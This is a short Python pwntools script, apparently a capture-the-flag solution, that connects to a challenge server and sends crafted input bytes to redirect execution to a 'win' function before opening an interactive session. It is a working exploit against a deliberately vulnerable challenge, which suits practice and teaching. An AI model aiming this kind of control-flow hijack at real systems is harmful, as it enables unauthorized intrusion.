from pwn import *

remote = connect("challs.nusgreyhats.org", 33102)

# win function address: 0x5555555555555fc9
player_symbols = [b"\xc9", b"\x5f"]

remote.clean()
remote.sendline(player_symbols[0])
remote.sendline(player_symbols[1])

for i in range(16):
    remote.sendline(b'0')
remote.sendline(b'2')
for i in range(16):
    remote.sendline(b'1')

remote.sendline(b'8')
remote.interactive()

